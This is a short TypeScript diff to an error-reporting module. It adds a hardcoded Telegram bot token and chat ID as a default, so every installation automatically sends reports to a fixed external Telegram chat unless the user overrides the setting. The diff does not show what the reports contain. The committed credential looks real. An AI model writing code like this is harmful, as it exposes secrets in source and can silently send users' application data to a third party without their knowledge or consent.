@@ -10,6 +10,11 @@ type TelegramConfig = {
 
 type ReportDetails = Record<string, unknown>
 
+// Bundled fallback keeps production reporting automatic after installation.
+// Environment variables and the per-user config file can still override it.
+const BUNDLED_TELEGRAM_BOT_TOKEN = '8841287120:AAEUYamxi4sEQpbJulBBU6Ph9wzcTs8InfE'
+const BUNDLED_TELEGRAM_CHAT_ID = '1397184795'
+
 const MAX_REPORTS_PER_HOUR = 20
 const DUPLICATE_WINDOW_MS = 10 * 60 * 1000
 const reportHistory = new Map<string, number>()
@@ -29,8 +34,8 @@ function readConfig(): { token: string; chatIds: string[] } {
     // Reporting must never affect application startup.
   }
 
-  const token = envToken || String(fileConfig.token || '').trim()
-  const rawChatIds = envChatIds || String(fileConfig.chatId || '')
+  const token = envToken || String(fileConfig.token || '').trim() || BUNDLED_TELEGRAM_BOT_TOKEN
+  const rawChatIds = envChatIds || String(fileConfig.chatId || '').trim() || BUNDLED_TELEGRAM_CHAT_ID
   const chatIds = rawChatIds
     .split(',')
     .map((value) => value.trim())
